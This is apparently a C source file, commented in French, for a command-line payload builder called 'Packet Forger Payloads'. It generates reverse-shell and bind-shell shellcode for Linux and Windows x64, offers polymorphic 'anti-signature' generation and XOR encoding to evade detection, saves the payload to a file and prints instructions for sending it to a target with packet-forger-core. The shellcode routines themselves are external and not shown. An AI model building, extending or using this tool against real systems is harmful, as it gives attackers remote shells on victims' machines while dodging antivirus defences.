#define _POSIX_C_SOURCE 200809L
#include "../include/payload_generator.h"
#include "../include/verbose_utils.h"
#include <getopt.h>
#include <string.h>
#include <stdlib.h>

// Utiliser la variable globale verbose_mode de verbose_utils.h
extern int verbose_mode;

// Déclarations externes pour les fonctions de format
extern int generate_metadata_json(const char *output_file, const char *platform, const char *type,
                                  size_t size, int polymorphic, int encoded,
                                  const char *lhost, int lport);
extern int save_payload_binary(const unsigned char *shellcode, int shellcode_len, const char *output_file);

/**
 * @file payload_builder.c
 * @brief CLI indépendante pour générer des payloads
 * 
 * Cette CLI génère des payloads binaires sans dépendance vers le core.
 */

void print_usage(const char *prog_name) {
    printf("Usage: %s build <platform> <type> [options]\n", prog_name);
    printf("\n");
    printf("Plateformes:\n");
    printf("  linux    : Génération pour Linux x64\n");
    printf("  windows  : Génération pour Windows x64\n");
    printf("\n");
    printf("Types:\n");
    printf("  reverse  : Reverse shell (connexion vers l'attaquant)\n");
    printf("  bind     : Bind shell (écoute sur un port)\n");
    printf("\n");
    printf("Options requises:\n");
    printf("  --lhost <ip>      : IP du listener (pour reverse shell)\n");
    printf("  --lport <port>    : Port du listener\n");
    printf("  --output <file>   : Fichier de sortie (.bin) [défaut: payload.bin]\n");
    printf("\n");
    printf("Options avancées:\n");
    printf("  --polymorphic     : Génération polymorphe (anti-signature)\n");
    printf("  --asm             : Génération en assembleur pur (NASM)\n");
    printf("  --encode-xor      : Encodage XOR du payload\n");
    printf("  --verbose, -V     : Mode verbeux (hexdump, détails)\n");
    printf("\n");
    printf("Exemples:\n");
    printf("  %s build windows reverse --lhost 192.168.10.20 --lport 4444 --output payload.bin\n", prog_name);
    printf("  %s build linux reverse --lhost 192.168.10.20 --lport 4444 --polymorphic\n", prog_name);
    printf("  %s build linux bind --lport 4444 --output bind.bin\n", prog_name);
    printf("\n");
    printf("Note: Les payloads générés peuvent être transportés via packet-forger-core.\n");
}

int main(int argc, char *argv[]) {
    const char *platform = NULL;
    const char *type = NULL;
    const char *lhost = NULL;
    int lport = 0;
    const char *output = "payload.bin";
    int polymorphic = 0;
    int use_asm = 0;
    int encode_xor = 0;
    
    unsigned char shellcode[4096];
    unsigned char encoded_shellcode[4096];
    unsigned char xor_key = 0;
    int shellcode_len = 0;
    int opt;
    int option_index = 0;
    
    // Options longues
    static struct option long_options[] = {
        {"lhost", required_argument, 0, 'H'},
        {"lport", required_argument, 0, 'P'},
        {"output", required_argument, 0, 'o'},
        {"polymorphic", no_argument, 0, 'p'},
        {"asm", no_argument, 0, 'a'},
        {"encode-xor", no_argument, 0, 'e'},
        {"verbose", no_argument, 0, 'V'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };
    
    // Parse des arguments
    if (argc < 4) {
        print_usage(argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "build") != 0) {
        fprintf(stderr, "[-] Erreur : commande inconnue (utilisez 'build')\n");
        print_usage(argv[0]);
        return 1;
    }
    
    platform = argv[2];
    type = argv[3];
    
    // Vérifier la plateforme
    if (strcmp(platform, "linux") != 0 && strcmp(platform, "windows") != 0) {
        fprintf(stderr, "[-] Erreur : plateforme inconnue (linux ou windows)\n");
        return 1;
    }
    
    // Vérifier le type
    if (strcmp(type, "reverse") != 0 && strcmp(type, "bind") != 0) {
        fprintf(stderr, "[-] Erreur : type inconnu (reverse ou bind)\n");
        return 1;
    }
    
    // Parse des options
    while ((opt = getopt_long(argc - 3, argv + 3, "H:P:o:paeVh", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'H':
                lhost = optarg;
                break;
            case 'P':
                lport = atoi(optarg);
                break;
            case 'o':
                output = optarg;
                break;
            case 'p':
                polymorphic = 1;
                break;
            case 'a':
                use_asm = 1;
                break;
            case 'e':
                encode_xor = 1;
                break;
            case 'V':
                verbose_mode = 1;
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Vérifications
    if (strcmp(type, "reverse") == 0 && !lhost) {
        fprintf(stderr, "[-] Erreur : --lhost requis pour reverse shell\n");
        return 1;
    }
    
    if (lport == 0) {
        fprintf(stderr, "[-] Erreur : --lport requis\n");
        return 1;
    }
    
    printf("\n[*] Packet Forger Payloads - Génération de payload\n");
    printf("[*] ===============================================\n");
    printf("[*] Plateforme : %s\n", platform);
    printf("[*] Type : %s\n", type);
    if (lhost) {
        printf("[*] Listener : %s:%d\n", lhost, lport);
    } else {
        printf("[*] Port d'écoute : %d\n", lport);
    }
    printf("[*] Sortie : %s\n", output);
    
    // Génération du payload
    printf("\n[*] Génération du payload...\n");
    
    if (verbose_mode) {
        printf("[~] Paramètres de génération :\n");
        printf("[~]   - Plateforme : %s\n", platform);
        printf("[~]   - Type : %s\n", type);
        if (lhost) printf("[~]   - Listener IP : %s\n", lhost);
        printf("[~]   - Listener Port : %d\n", lport);
        if (polymorphic) printf("[~]   - Mode polymorphe : Activé\n");
        if (use_asm) printf("[~]   - Génération ASM : Activée\n");
        printf("[~] Démarrage de la génération...\n");
    }
    
    if (polymorphic) {
        if (verbose_mode) printf("[~] Génération polymorphe en cours...\n");
        printf("[*] Mode polymorphe activé\n");
        shellcode_len = generate_polymorphic_shellcode(lhost, lport, platform, shellcode, sizeof(shellcode));
    } else if (use_asm) {
        if (verbose_mode) printf("[~] Génération assembleur pur en cours...\n");
        printf("[*] Génération assembleur pur activée\n");
        shellcode_len = generate_and_assemble_shellcode(lhost, lport, platform, shellcode, sizeof(shellcode));
    } else {
        // Génération standard
        if (strcmp(platform, "linux") == 0) {
            if (verbose_mode) printf("[~] Génération shellcode Linux x64...\n");
            if (strcmp(type, "reverse") == 0) {
                shellcode_len = generate_shellcode(lhost, lport, shellcode);
            } else {
                shellcode_len = generate_bind_shell_linux(lport, shellcode);
            }
        } else {  // windows
            if (verbose_mode) printf("[~] Génération shellcode Windows x64 (résolution dynamique API)...\n");
            if (strcmp(type, "reverse") == 0) {
                shellcode_len = generate_windows_shellcode_dynamic(lhost, lport, shellcode, sizeof(shellcode));
                if (shellcode_len < 0) {
                    if (verbose_mode) printf("[~] Fallback sur méthode template...\n");
                    // Fallback sur la méthode template
                    shellcode_len = generate_shellcode_windows(lhost, lport, shellcode);
                }
            } else {
                fprintf(stderr, "[-] Erreur : bind shell Windows non implémenté\n");
                return 1;
            }
        }
    }
    
    if (verbose_mode && shellcode_len > 0) {
        printf("[~] Génération terminée : %d bytes générés\n", shellcode_len);
    }
    
    if (shellcode_len < 0) {
        fprintf(stderr, "[-] Erreur : génération du payload échouée\n");
        return 1;
    }
    
    printf("[+] Payload généré : %d bytes\n", shellcode_len);
    
    // Affichage verbeux si demandé
    if (verbose_mode) {
        print_payload_details(shellcode, shellcode_len, platform, type, 
                            polymorphic, 0, 0);
    }
    
    // Encodage XOR si demandé
    if (encode_xor) {
        printf("[*] Encodage XOR...\n");
        int encoded_len = encode_shellcode_xor(shellcode, shellcode_len, encoded_shellcode, &xor_key);
        if (encoded_len < 0) {
            fprintf(stderr, "[-] Erreur : encodage XOR échoué\n");
            return 1;
        }
        memcpy(shellcode, encoded_shellcode, encoded_len);
        shellcode_len = encoded_len;
        printf("[+] Payload encodé (clé XOR: 0x%02x) : %d bytes\n", xor_key, shellcode_len);
        
        // Affichage verbeux après encodage
        if (verbose_mode) {
            printf("\n[~] Payload après encodage XOR:\n");
            hexdump(shellcode, shellcode_len, "Payload encodé");
        }
    }
    
    // Sauvegarder le payload binaire
    if (save_payload_binary(shellcode, shellcode_len, output) < 0) {
        return 1;
    }
    
    // Générer la metadata JSON
    const char *payload_type = (strcmp(type, "reverse") == 0) ? "reverse_shell" : "bind_shell";
    if (generate_metadata_json(output, platform, payload_type, shellcode_len, polymorphic, encode_xor, lhost, lport) < 0) {
        fprintf(stderr, "[-] Avertissement : génération metadata JSON échouée (optionnel)\n");
    }
    
    printf("\n[+] Payload généré avec succès : %s\n", output);
    printf("[*] Pour transporter ce payload :\n");
    printf("[*]   packet-forger-core --payload %s --target <ip> --port <port>\n", output);
    
    return 0;
}

